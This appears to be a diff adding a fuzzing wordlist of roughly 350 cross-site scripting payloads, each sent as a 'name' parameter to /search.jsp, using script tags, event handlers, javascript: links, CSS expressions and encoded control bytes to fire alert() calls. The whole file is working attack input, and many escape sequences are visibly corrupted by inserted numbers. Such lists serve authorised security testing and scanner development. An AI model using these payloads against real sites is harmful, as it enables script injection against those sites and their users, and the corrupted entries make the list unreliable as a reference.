@@ -1,0 +1,1699 @@
+/search.jsp?<script\x20type="text/javascript">javascript:alert(1);</script>
+/search.jsp?name=<script\x3Etype="text/javascript">javascript:alert(2);</script>
+/search.jsp?name=<script\x0Dtype="text/javascript">javascript:alert(3);</script>
+/search.jsp?name=<script\x09type="text/javascript">javascript:alert(4);</script>
+/search.jsp?name=<script\x0Ctype="text/javascript">javascript:alert(5);</script>
+/search.jsp?name=<script\x2Ftype="text/javascript">javascript:alert(6);</script>
+/search.jsp?name=<script\x0Atype="text/javascript">javascript:alert(7);</script>
+/search.jsp?name='`"><\x3Cscript>javascript:alert(8)</script>
+/search.jsp?name='`"><\x00script>javascript:alert(9)</script>
+/search.jsp?name=<img src=10 href=10 onerror="javascript:alert(10)"></img>
+/search.jsp?name=<audio src=11 href=11 onerror="javascript:alert(11)"></audio>
+/search.jsp?name=<video src=12 href=12 onerror="javascript:alert(12)"></video>
+/search.jsp?name=<body src=13 href=13 onerror="javascript:alert(13)"></body>
+/search.jsp?name=<image src=14 href=14 onerror="javascript:alert(14)"></image>
+/search.jsp?name=<object src=15 href=15 onerror="javascript:alert(15)"></object>
+/search.jsp?name=<script src=16 href=16 onerror="javascript:alert(16)"></script>
+/search.jsp?name=<svg onResize svg onResize="javascript:javascript:alert(17)"></svg onResize>
+/search.jsp?name=<title onPropertyChange title onPropertyChange="javascript:javascript:alert(18)"></title onPropertyChange>
+/search.jsp?name=<iframe onLoad iframe onLoad="javascript:javascript:alert(19)"></iframe onLoad>
+/search.jsp?name=<body onMouseEnter body onMouseEnter="javascript:javascript:alert(20)"></body onMouseEnter>
+/search.jsp?name=<body onFocus body onFocus="javascript:javascript:alert(21)"></body onFocus>
+/search.jsp?name=<frameset onScroll frameset onScroll="javascript:javascript:alert(22)"></frameset onScroll>
+/search.jsp?name=<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(23)"></script onReadyStateChange>
+/search.jsp?name=<html onMouseUp html onMouseUp="javascript:javascript:alert(24)"></html onMouseUp>
+/search.jsp?name=<body onPropertyChange body onPropertyChange="javascript:javascript:alert(25)"></body onPropertyChange>
+/search.jsp?name=<svg onLoad svg onLoad="javascript:javascript:alert(26)"></svg onLoad>
+/search.jsp?name=<body onPageHide body onPageHide="javascript:javascript:alert(27)"></body onPageHide>
+/search.jsp?name=<body onMouseOver body onMouseOver="javascript:javascript:alert(28)"></body onMouseOver>
+/search.jsp?name=<body onUnload body onUnload="javascript:javascript:alert(29)"></body onUnload>
+/search.jsp?name=<body onLoad body onLoad="javascript:javascript:alert(30)"></body onLoad>
+/search.jsp?name=<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(31)"></bgsound onPropertyChange>
+/search.jsp?name=<html onMouseLeave html onMouseLeave="javascript:javascript:alert(32)"></html onMouseLeave>
+/search.jsp?name=<html onMouseWheel html onMouseWheel="javascript:javascript:alert(33)"></html onMouseWheel>
+/search.jsp?name=<style onLoad style onLoad="javascript:javascript:alert(34)"></style onLoad>
+/search.jsp?name=<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(35)"></iframe onReadyStateChange>
+/search.jsp?name=<body onPageShow body onPageShow="javascript:javascript:alert(36)"></body onPageShow>
+/search.jsp?name=<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(37)"></style onReadyStateChange>
+/search.jsp?name=<frameset onFocus frameset onFocus="javascript:javascript:alert(38)"></frameset onFocus>
+/search.jsp?name=<applet onError applet onError="javascript:javascript:alert(39)"></applet onError>
+/search.jsp?name=<marquee onStart marquee onStart="javascript:javascript:alert(40)"></marquee onStart>
+/search.jsp?name=<script onLoad script onLoad="javascript:javascript:alert(41)"></script onLoad>
+/search.jsp?name=<html onMouseOver html onMouseOver="javascript:javascript:alert(42)"></html onMouseOver>
+/search.jsp?name=<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(43)"></html onMouseEnter>
+/search.jsp?name=<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(44)"></body onBeforeUnload>
+/search.jsp?name=<html onMouseDown html onMouseDown="javascript:javascript:alert(45)"></html onMouseDown>
+/search.jsp?name=<marquee onScroll marquee onScroll="javascript:javascript:alert(46)"></marquee onScroll>
+/search.jsp?name=<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(47)"></xml onPropertyChange>
+/search.jsp?name=<frameset onBlur frameset onBlur="javascript:javascript:alert(48)"></frameset onBlur>
+/search.jsp?name=<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(49)"></applet onReadyStateChange>
+/search.jsp?name=<svg onUnload svg onUnload="javascript:javascript:alert(50)"></svg onUnload>
+/search.jsp?name=<html onMouseOut html onMouseOut="javascript:javascript:alert(51)"></html onMouseOut>
+/search.jsp?name=<body onMouseMove body onMouseMove="javascript:javascript:alert(52)"></body onMouseMove>
+/search.jsp?name=<body onResize body onResize="javascript:javascript:alert(53)"></body onResize>
+/search.jsp?name=<object onError object onError="javascript:javascript:alert(54)"></object onError>
+/search.jsp?name=<body onPopState body onPopState="javascript:javascript:alert(55)"></body onPopState>
+/search.jsp?name=<html onMouseMove html onMouseMove="javascript:javascript:alert(56)"></html onMouseMove>
+/search.jsp?name=<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(57)"></applet onreadystatechange>
+/search.jsp?name=<body onpagehide body onpagehide="javascript:javascript:alert(58)"></body onpagehide>
+/search.jsp?name=<svg onunload svg onunload="javascript:javascript:alert(59)"></svg onunload>
+/search.jsp?name=<applet onerror applet onerror="javascript:javascript:alert(60)"></applet onerror>
+/search.jsp?name=<body onkeyup body onkeyup="javascript:javascript:alert(61)"></body onkeyup>
+/search.jsp?name=<body onunload body onunload="javascript:javascript:alert(62)"></body onunload>
+/search.jsp?name=<iframe onload iframe onload="javascript:javascript:alert(63)"></iframe onload>
+/search.jsp?name=<body onload body onload="javascript:javascript:alert(64)"></body onload>
+/search.jsp?name=<html onmouseover html onmouseover="javascript:javascript:alert(65)"></html onmouseover>
+/search.jsp?name=<object onbeforeload object onbeforeload="javascript:javascript:alert(66)"></object onbeforeload>
+/search.jsp?name=<body onbeforeunload body onbeforeunload="javascript:javascript:alert(67)"></body onbeforeunload>
+/search.jsp?name=<body onfocus body onfocus="javascript:javascript:alert(68)"></body onfocus>
+/search.jsp?name=<body onkeydown body onkeydown="javascript:javascript:alert(69)"></body onkeydown>
+/search.jsp?name=<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(70)"></iframe onbeforeload>
+/search.jsp?name=<iframe src iframe src="javascript:javascript:alert(71)"></iframe src>
+/search.jsp?name=<svg onload svg onload="javascript:javascript:alert(72)"></svg onload>
+/search.jsp?name=<html onmousemove html onmousemove="javascript:javascript:alert(73)"></html onmousemove>
+/search.jsp?name=<body onblur body onblur="javascript:javascript:alert(74)"></body onblur>
+/search.jsp?name=\x3Cscript>javascript:alert(75)</script>
+/search.jsp?name='"`><script>/* *\x2Fjavascript:alert(76)// */</script>
+/search.jsp?name=<script>javascript:alert(77)</script\x0D
+/search.jsp?name=<script>javascript:alert(78)</script\x0A
+/search.jsp?name=<script>javascript:alert(79)</script\x0B
+/search.jsp?name=<script charset="\x22>javascript:alert(80)</script>
+/search.jsp?name=<!--\x3E<img src=xxx:x onerror=javascript:alert(81)> -->
+/search.jsp?name=--><!-- ---> <img src=xxx:x onerror=javascript:alert(82)> -->
+/search.jsp?name=--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(83)> -->
+/search.jsp?name=--><!-- --\x284> <img src=xxx:x onerror=javascript:alert(84)> -->
+/search.jsp?name=--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(85)> -->
+/search.jsp?name=`"'><img src='#\x27 onerror=javascript:alert(86)>
+/search.jsp?name=<a href="javascript\x3Ajavascript:alert(87)" id="fuzzelement87">test</a>
+/search.jsp?name="'`><p><svg><script>a='hello\x27;javascript:alert(88)//';</script></p>
+/search.jsp?name=<a href="javas\x00cript:javascript:alert(89)" id="fuzzelement89">test</a>
+/search.jsp?name=<a href="javas\x07cript:javascript:alert(90)" id="fuzzelement90">test</a>
+/search.jsp?name=<a href="javas\x0Dcript:javascript:alert(91)" id="fuzzelement91">test</a>
+/search.jsp?name=<a href="javas\x0Acript:javascript:alert(92)" id="fuzzelement92">test</a>
+/search.jsp?name=<a href="javas\x08cript:javascript:alert(93)" id="fuzzelement93">test</a>
+/search.jsp?name=<a href="javas\x02cript:javascript:alert(94)" id="fuzzelement94">test</a>
+/search.jsp?name=<a href="javas\x03cript:javascript:alert(95)" id="fuzzelement95">test</a>
+/search.jsp?name=<a href="javas\x04cript:javascript:alert(96)" id="fuzzelement96">test</a>
+/search.jsp?name=<a href="javas\x097cript:javascript:alert(97)" id="fuzzelement97">test</a>
+/search.jsp?name=<a href="javas\x05cript:javascript:alert(98)" id="fuzzelement98">test</a>
+/search.jsp?name=<a href="javas\x0Bcript:javascript:alert(99)" id="fuzzelement99">test</a>
+/search.jsp?name=<a href="javas\x09cript:javascript:alert(100)" id="fuzzelement100">test</a>
+/search.jsp?name=<a href="javas\x06cript:javascript:alert(101)" id="fuzzelement101">test</a>
+/search.jsp?name=<a href="javas\x0Ccript:javascript:alert(102)" id="fuzzelement102">test</a>
+/search.jsp?name=<script>/* *\x2A/javascript:alert(103)// */</script>
+/search.jsp?name=<script>/* *\x00/javascript:alert(104)// */</script>
+/search.jsp?name=<style></style\x3E<img src="about:blank" onerror=javascript:alert(105)//></style>
+/search.jsp?name=<style></style\x0D<img src="about:blank" onerror=javascript:alert(106)//></style>
+/search.jsp?name=<style></style\x09<img src="about:blank" onerror=javascript:alert(107)//></style>
+/search.jsp?name=<style></style\x20<img src="about:blank" onerror=javascript:alert(108)//></style>
+/search.jsp?name=<style></style\x0A<img src="about:blank" onerror=javascript:alert(109)//></style>
+/search.jsp?name="'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(110);/*';">DEF
+/search.jsp?name="'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(111);/*';">DEF
+/search.jsp?name=<script>if("x\\xE112\x96\x89".length==2) { javascript:alert(112);}</script>
+/search.jsp?name=<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(113);}</script>
+/search.jsp?name=<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(114);}</script>
+/search.jsp?name='`"><\x3Cscript>javascript:alert(115)</script>
+/search.jsp?name='`"><\x00script>javascript:alert(116)</script>
+/search.jsp?name="'`><\x3Cimg src=xxx:x onerror=javascript:alert(117)>
+/search.jsp?name="'`><\x00img src=xxx:x onerror=javascript:alert(118)>
+/search.jsp?name=<script src="data:text/plain\x2Cjavascript:alert(119)"></script>
+/search.jsp?name=<script src="data:\xD4\x8F,javascript:alert(120)"></script>
+/search.jsp?name=<script src="data:\xE0\xA4\x98,javascript:alert(121)"></script>
+/search.jsp?name=<script src="data:\xCB\x8F,javascript:alert(122)"></script>
+/search.jsp?name=<script\x20type="text/javascript">javascript:alert(123);</script>
+/search.jsp?name=<script\x3Etype="text/javascript">javascript:alert(124);</script>
+/search.jsp?name=<script\x0Dtype="text/javascript">javascript:alert(125);</script>
+/search.jsp?name=<script\x09type="text/javascript">javascript:alert(126);</script>
+/search.jsp?name=<script\x0Ctype="text/javascript">javascript:alert(127);</script>
+/search.jsp?name=<script\x2Ftype="text/javascript">javascript:alert(128);</script>
+/search.jsp?name=<script\x0Atype="text/javascript">javascript:alert(129);</script>
+/search.jsp?name=ABC<div style="x\x3Aexpression(javascript:alert(130)">DEF
+/search.jsp?name=ABC<div style="x:expression\x5C(javascript:alert(131)">DEF
+/search.jsp?name=ABC<div style="x:expression\x00(javascript:alert(132)">DEF
+/search.jsp?name=ABC<div style="x:exp\x00ression(javascript:alert(133)">DEF
+/search.jsp?name=ABC<div style="x:exp\x5Cression(javascript:alert(134)">DEF
+/search.jsp?name=ABC<div style="x:\x0Aexpression(javascript:alert(135)">DEF
+/search.jsp?name=ABC<div style="x:\x09expression(javascript:alert(136)">DEF
+/search.jsp?name=ABC<div style="x:\xE3\x80\x80expression(javascript:alert(137)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x84expression(javascript:alert(138)">DEF
+/search.jsp?name=ABC<div style="x:\xC2\xA0expression(javascript:alert(139)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x80expression(javascript:alert(140)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(141)">DEF
+/search.jsp?name=ABC<div style="x:\x0Dexpression(javascript:alert(142)">DEF
+/search.jsp?name=ABC<div style="x:\x0Cexpression(javascript:alert(143)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x87expression(javascript:alert(144)">DEF
+/search.jsp?name=ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(145)">DEF
+/search.jsp?name=ABC<div style="x:\x20expression(javascript:alert(146)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x88expression(javascript:alert(147)">DEF
+/search.jsp?name=ABC<div style="x:\x00expression(javascript:alert(148)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(149)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x86expression(javascript:alert(150)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x85expression(javascript:alert(151)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x82expression(javascript:alert(152)">DEF
+/search.jsp?name=ABC<div style="x:\x0Bexpression(javascript:alert(153)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x8154expression(javascript:alert(154)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x83expression(javascript:alert(155)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x89expression(javascript:alert(156)">DEF
+/search.jsp?name=<a href="\x0Bjavascript:javascript:alert(157)" id="fuzzelement157">test</a>
+/search.jsp?name=<a href="\x0Fjavascript:javascript:alert(158)" id="fuzzelement158">test</a>
+/search.jsp?name=<a href="\xC2\xA0javascript:javascript:alert(159)" id="fuzzelement159">test</a>
+/search.jsp?name=<a href="\x05javascript:javascript:alert(160)" id="fuzzelement160">test</a>
+/search.jsp?name=<a href="\xE161\xA0\x8Ejavascript:javascript:alert(161)" id="fuzzelement161">test</a>
+/search.jsp?name=<a href="\x1628javascript:javascript:alert(162)" id="fuzzelement162">test</a>
+/search.jsp?name=<a href="\x163163javascript:javascript:alert(163)" id="fuzzelement163">test</a>
+/search.jsp?name=<a href="\xE2\x80\x88javascript:javascript:alert(164)" id="fuzzelement164">test</a>
+/search.jsp?name=<a href="\xE2\x80\x89javascript:javascript:alert(165)" id="fuzzelement165">test</a>
+/search.jsp?name=<a href="\xE2\x80\x80javascript:javascript:alert(166)" id="fuzzelement166">test</a>
+/search.jsp?name=<a href="\x1677javascript:javascript:alert(167)" id="fuzzelement167">test</a>
+/search.jsp?name=<a href="\x03javascript:javascript:alert(168)" id="fuzzelement168">test</a>
+/search.jsp?name=<a href="\x0Ejavascript:javascript:alert(169)" id="fuzzelement169">test</a>
+/search.jsp?name=<a href="\x170Ajavascript:javascript:alert(170)" id="fuzzelement170">test</a>
+/search.jsp?name=<a href="\x00javascript:javascript:alert(171)" id="fuzzelement171">test</a>
+/search.jsp?name=<a href="\x1720javascript:javascript:alert(172)" id="fuzzelement172">test</a>
+/search.jsp?name=<a href="\xE2\x80\x82javascript:javascript:alert(173)" id="fuzzelement173">test</a>
+/search.jsp?name=<a href="\x20javascript:javascript:alert(174)" id="fuzzelement174">test</a>
+/search.jsp?name=<a href="\x1753javascript:javascript:alert(175)" id="fuzzelement175">test</a>
+/search.jsp?name=<a href="\x09javascript:javascript:alert(176)" id="fuzzelement176">test</a>
+/search.jsp?name=<a href="\xE2\x80\x8Ajavascript:javascript:alert(177)" id="fuzzelement177">test</a>
+/search.jsp?name=<a href="\x1784javascript:javascript:alert(178)" id="fuzzelement178">test</a>
+/search.jsp?name=<a href="\x1799javascript:javascript:alert(179)" id="fuzzelement179">test</a>
+/search.jsp?name=<a href="\xE2\x80\xAFjavascript:javascript:alert(180)" id="fuzzelement180">test</a>
+/search.jsp?name=<a href="\x181Fjavascript:javascript:alert(181)" id="fuzzelement181">test</a>
+/search.jsp?name=<a href="\xE2\x80\x8182javascript:javascript:alert(182)" id="fuzzelement182">test</a>
+/search.jsp?name=<a href="\x183Djavascript:javascript:alert(183)" id="fuzzelement183">test</a>
+/search.jsp?name=<a href="\xE2\x80\x87javascript:javascript:alert(184)" id="fuzzelement184">test</a>
+/search.jsp?name=<a href="\x07javascript:javascript:alert(185)" id="fuzzelement185">test</a>
+/search.jsp?name=<a href="\xE186\x9A\x80javascript:javascript:alert(186)" id="fuzzelement186">test</a>
+/search.jsp?name=<a href="\xE2\x80\x83javascript:javascript:alert(187)" id="fuzzelement187">test</a>
+/search.jsp?name=<a href="\x04javascript:javascript:alert(188)" id="fuzzelement188">test</a>
+/search.jsp?name=<a href="\x0189javascript:javascript:alert(189)" id="fuzzelement189">test</a>
+/search.jsp?name=<a href="\x08javascript:javascript:alert(190)" id="fuzzelement190">test</a>
+/search.jsp?name=<a href="\xE2\x80\x84javascript:javascript:alert(191)" id="fuzzelement191">test</a>
+/search.jsp?name=<a href="\xE2\x80\x86javascript:javascript:alert(192)" id="fuzzelement192">test</a>
+/search.jsp?name=<a href="\xE3\x80\x80javascript:javascript:alert(193)" id="fuzzelement193">test</a>
+/search.jsp?name=<a href="\x1942javascript:javascript:alert(194)" id="fuzzelement194">test</a>
+/search.jsp?name=<a href="\x0Djavascript:javascript:alert(195)" id="fuzzelement195">test</a>
+/search.jsp?name=<a href="\x0Ajavascript:javascript:alert(196)" id="fuzzelement196">test</a>
+/search.jsp?name=<a href="\x0Cjavascript:javascript:alert(197)" id="fuzzelement197">test</a>
+/search.jsp?name=<a href="\x1985javascript:javascript:alert(198)" id="fuzzelement198">test</a>
+/search.jsp?name=<a href="\xE2\x80\xA8javascript:javascript:alert(199)" id="fuzzelement199">test</a>
+/search.jsp?name=<a href="\x2006javascript:javascript:alert(200)" id="fuzzelement200">test</a>
+/search.jsp?name=<a href="\x02javascript:javascript:alert(201)" id="fuzzelement201">test</a>
+/search.jsp?name=<a href="\x202Bjavascript:javascript:alert(202)" id="fuzzelement202">test</a>
+/search.jsp?name=<a href="\x06javascript:javascript:alert(203)" id="fuzzelement203">test</a>
+/search.jsp?name=<a href="\xE2\x80\xA9javascript:javascript:alert(204)" id="fuzzelement204">test</a>
+/search.jsp?name=<a href="\xE2\x80\x85javascript:javascript:alert(205)" id="fuzzelement205">test</a>
+/search.jsp?name=<a href="\x206Ejavascript:javascript:alert(206)" id="fuzzelement206">test</a>
+/search.jsp?name=<a href="\xE2\x8207\x9Fjavascript:javascript:alert(207)" id="fuzzelement207">test</a>
+/search.jsp?name=<a href="\x208Cjavascript:javascript:alert(208)" id="fuzzelement208">test</a>
+/search.jsp?name=<a href="javascript\x00:javascript:alert(209)" id="fuzzelement209">test</a>
+/search.jsp?name=<a href="javascript\x3A:javascript:alert(210)" id="fuzzelement210">test</a>
+/search.jsp?name=<a href="javascript\x09:javascript:alert(211)" id="fuzzelement211">test</a>
+/search.jsp?name=<a href="javascript\x0D:javascript:alert(212)" id="fuzzelement212">test</a>
+/search.jsp?name=<a href="javascript\x0A:javascript:alert(213)" id="fuzzelement213">test</a>
+/search.jsp?name=`"'><img src=xxx:x \x0Aonerror=javascript:alert(214)>
+/search.jsp?name=`"'><img src=xxx:x \x22onerror=javascript:alert(215)>
+/search.jsp?name=`"'><img src=xxx:x \x0Bonerror=javascript:alert(216)>
+/search.jsp?name=`"'><img src=xxx:x \x0Donerror=javascript:alert(217)>
+/search.jsp?name=`"'><img src=xxx:x \x2Fonerror=javascript:alert(218)>
+/search.jsp?name=`"'><img src=xxx:x \x09onerror=javascript:alert(219)>
+/search.jsp?name=`"'><img src=xxx:x \x0Conerror=javascript:alert(220)>
+/search.jsp?name=`"'><img src=xxx:x \x00onerror=javascript:alert(221)>
+/search.jsp?name=`"'><img src=xxx:x \x27onerror=javascript:alert(222)>
+/search.jsp?name=`"'><img src=xxx:x \x20onerror=javascript:alert(223)>
+/search.jsp?name="`'><script>\x3Bjavascript:alert(224)</script>
+/search.jsp?name="`'><script>\x0Djavascript:alert(225)</script>
+/search.jsp?name="`'><script>\xEF\xBB\xBFjavascript:alert(226)</script>
+/search.jsp?name="`'><script>\xE2\x80\x8227javascript:alert(227)</script>
+/search.jsp?name="`'><script>\xE2\x80\x84javascript:alert(228)</script>
+/search.jsp?name="`'><script>\xE3\x80\x80javascript:alert(229)</script>
+/search.jsp?name="`'><script>\x09javascript:alert(230)</script>
+/search.jsp?name="`'><script>\xE2\x80\x89javascript:alert(231)</script>
+/search.jsp?name="`'><script>\xE2\x80\x85javascript:alert(232)</script>
+/search.jsp?name="`'><script>\xE2\x80\x88javascript:alert(233)</script>
+/search.jsp?name="`'><script>\x00javascript:alert(234)</script>
+/search.jsp?name="`'><script>\xE2\x80\xA8javascript:alert(235)</script>
+/search.jsp?name="`'><script>\xE2\x80\x8Ajavascript:alert(236)</script>
+/search.jsp?name="`'><script>\xE237\x9A\x80javascript:alert(237)</script>
+/search.jsp?name="`'><script>\x0Cjavascript:alert(238)</script>
+/search.jsp?name="`'><script>\x2Bjavascript:alert(239)</script>
+/search.jsp?name="`'><script>\xF0\x90\x96\x9Ajavascript:alert(240)</script>
+/search.jsp?name="`'><script>-javascript:alert(241)</script>
+/search.jsp?name="`'><script>\x0Ajavascript:alert(242)</script>
+/search.jsp?name="`'><script>\xE2\x80\xAFjavascript:alert(243)</script>
+/search.jsp?name="`'><script>\x7Ejavascript:alert(244)</script>
+/search.jsp?name="`'><script>\xE2\x80\x87javascript:alert(245)</script>
+/search.jsp?name="`'><script>\xE2\x8246\x9Fjavascript:alert(246)</script>
+/search.jsp?name="`'><script>\xE2\x80\xA9javascript:alert(247)</script>
+/search.jsp?name="`'><script>\xC2\x85javascript:alert(248)</script>
+/search.jsp?name="`'><script>\xEF\xBF\xAEjavascript:alert(249)</script>
+/search.jsp?name="`'><script>\xE2\x80\x83javascript:alert(250)</script>
+/search.jsp?name="`'><script>\xE2\x80\x8Bjavascript:alert(251)</script>
+/search.jsp?name="`'><script>\xEF\xBF\xBEjavascript:alert(252)</script>
+/search.jsp?name="`'><script>\xE2\x80\x80javascript:alert(253)</script>
+/search.jsp?name="`'><script>\x2254javascript:alert(254)</script>
+/search.jsp?name="`'><script>\xE2\x80\x82javascript:alert(255)</script>
+/search.jsp?name="`'><script>\xE2\x80\x86javascript:alert(256)</script>
+/search.jsp?name="`'><script>\xE257\xA0\x8Ejavascript:alert(257)</script>
+/search.jsp?name="`'><script>\x0Bjavascript:alert(258)</script>
+/search.jsp?name="`'><script>\x20javascript:alert(259)</script>
+/search.jsp?name="`'><script>\xC2\xA0javascript:alert(260)</script>
+/search.jsp?name="/><img/onerror=\x0Bjavascript:alert(261)\x0Bsrc=xxx:x />
+/search.jsp?name="/><img/onerror=\x22javascript:alert(262)\x22src=xxx:x />
+/search.jsp?name="/><img/onerror=\x09javascript:alert(263)\x09src=xxx:x />
+/search.jsp?name="/><img/onerror=\x27javascript:alert(264)\x27src=xxx:x />
+/search.jsp?name="/><img/onerror=\x0Ajavascript:alert(265)\x0Asrc=xxx:x />
+/search.jsp?name="/><img/onerror=\x0Cjavascript:alert(266)\x0Csrc=xxx:x />
+/search.jsp?name="/><img/onerror=\x0Djavascript:alert(267)\x0Dsrc=xxx:x />
+/search.jsp?name="/><img/onerror=\x60javascript:alert(268)\x60src=xxx:x />
+/search.jsp?name="/><img/onerror=\x20javascript:alert(269)\x20src=xxx:x />
+/search.jsp?name=<script\x2F>javascript:alert(270)</script>
+/search.jsp?name=<script\x20>javascript:alert(271)</script>
+/search.jsp?name=<script\x0D>javascript:alert(272)</script>
+/search.jsp?name=<script\x0A>javascript:alert(273)</script>
+/search.jsp?name=<script\x0C>javascript:alert(274)</script>
+/search.jsp?name=<script\x00>javascript:alert(275)</script>
+/search.jsp?name=<script\x09>javascript:alert(276)</script>
+/search.jsp?name=`"'><img src=xxx:x onerror\x0B=javascript:alert(277)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x00=javascript:alert(278)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x0C=javascript:alert(279)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x0D=javascript:alert(280)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x20=javascript:alert(281)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x0A=javascript:alert(282)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x09=javascript:alert(283)>
+/search.jsp?name=<script>javascript:alert(284)<\x00/script>
+/search.jsp?name=<img src=# onerror\x3D"javascript:alert(285)" >
+/search.jsp?name=<input onfocus=javascript:alert(286) autofocus>
+/search.jsp?name=<input onblur=javascript:alert(287) autofocus><input autofocus>
+/search.jsp?name=<video poster=javascript:javascript:alert(288)//
+/search.jsp?name=<body onscroll=javascript:alert(289)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+/search.jsp?name=<form id=test onforminput=javascript:alert(290)><input></form><button form=test onformchange=javascript:alert(290)>X
+/search.jsp?name=<video><source onerror="javascript:javascript:alert(291)">
+/search.jsp?name=<video onerror="javascript:javascript:alert(292)"><source>
+/search.jsp?name=<form><button formaction="javascript:javascript:alert(293)">X
+/search.jsp?name=<body oninput=javascript:alert(294)><input autofocus>
+/search.jsp?name=<math href="javascript:javascript:alert(295)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(295)">CLICKME</maction> </math>
+/search.jsp?name=<frameset onload=javascript:alert(296)>
+/search.jsp?name=<table background="javascript:javascript:alert(297)">
+/search.jsp?name=<!--<img src="--><img src=x onerror=javascript:alert(298)//">
+/search.jsp?name=<comment><img src="</comment><img src=x onerror=javascript:alert(299))//">
+/search.jsp?name=<![><img src="]><img src=x onerror=javascript:alert(300)//">
+/search.jsp?name=<style><img src="</style><img src=x onerror=javascript:alert(301)//">
+/search.jsp?name=<li style=list-style:url() onerror=javascript:alert(302)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(302)></div>
+/search.jsp?name=<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(303)//#">XXX</a></body>
+/search.jsp?name=<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(304)</SCRIPT>
+/search.jsp?name=<OBJECT CLASSID="clsid:333C7BC4-460F-305305D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(305)"></OBJECT>
+/search.jsp?name=<b <script>alert(308)</script>0
+/search.jsp?name=<div id="div309"><input value="``onmouseover=javascript:alert(309)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div309").innerHTML;</script>
+/search.jsp?name=<x '="foo"><x foo='><img src=x onerror=javascript:alert(310)//'>
+/search.jsp?name=<embed src="javascript:alert(311)">
+/search.jsp?name=<img src="javascript:alert(312)">
+/search.jsp?name=<image src="javascript:alert(313)">
+/search.jsp?name=<script src="javascript:alert(314)">
+/search.jsp?name=<div style=width:315px;filter:glow onfilterchange=javascript:alert(315)>x
+/search.jsp?name=<? foo="><script>javascript:alert(316)</script>">
+/search.jsp?name=<! foo="><script>javascript:alert(317)</script>">
+/search.jsp?name=</ foo="><script>javascript:alert(318)</script>">
+/search.jsp?name=<? foo="><x foo='?><script>javascript:alert(319)</script>'>">
+/search.jsp?name=<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(320)</script>">
+/search.jsp?name=<% foo><x foo="%><script>javascript:alert(321)</script>">
+/search.jsp?name=<div id=d><x xmlns="><iframe onload=javascript:alert(322)"></div> <script>d.innerHTML=d.innerHTML</script>
+/search.jsp?name=<img \x00src=x onerror="alert(323)">
+/search.jsp?name=<img \x47src=x onerror="javascript:alert(324)">
+/search.jsp?name=<img \x325325src=x onerror="javascript:alert(325)">
+/search.jsp?name=<img \x3262src=x onerror="javascript:alert(326)">
+/search.jsp?name=<img\x47src=x onerror="javascript:alert(327)">
+/search.jsp?name=<img\x3280src=x onerror="javascript:alert(328)">
+/search.jsp?name=<img\x3293src=x onerror="javascript:alert(329)">
+/search.jsp?name=<img\x32src=x onerror="javascript:alert(330)">
+/search.jsp?name=<img\x47src=x onerror="javascript:alert(331)">
+/search.jsp?name=<img\x332332src=x onerror="javascript:alert(332)">
+/search.jsp?name=<img \x47src=x onerror="javascript:alert(333)">
+/search.jsp?name=<img \x34src=x onerror="javascript:alert(334)">
+/search.jsp?name=<img \x39src=x onerror="javascript:alert(335)">
+/search.jsp?name=<img \x00src=x onerror="javascript:alert(336)">
+/search.jsp?name=<img src\x09=x onerror="javascript:alert(337)">
+/search.jsp?name=<img src\x3380=x onerror="javascript:alert(338)">
+/search.jsp?name=<img src\x3393=x onerror="javascript:alert(339)">
+/search.jsp?name=<img src\x32=x onerror="javascript:alert(340)">
+/search.jsp?name=<img src\x3412=x onerror="javascript:alert(341)">
+/search.jsp?name=<img src\x342342=x onerror="javascript:alert(342)">
+/search.jsp?name=<img src\x00=x onerror="javascript:alert(343)">
+/search.jsp?name=<img src\x47=x onerror="javascript:alert(344)">
+/search.jsp?name=<img src=x\x09onerror="javascript:alert(345)">
+/search.jsp?name=<img src=x\x3460onerror="javascript:alert(346)">
+/search.jsp?name=<img src=x\x347347onerror="javascript:alert(347)">
+/search.jsp?name=<img src=x\x3482onerror="javascript:alert(348)">
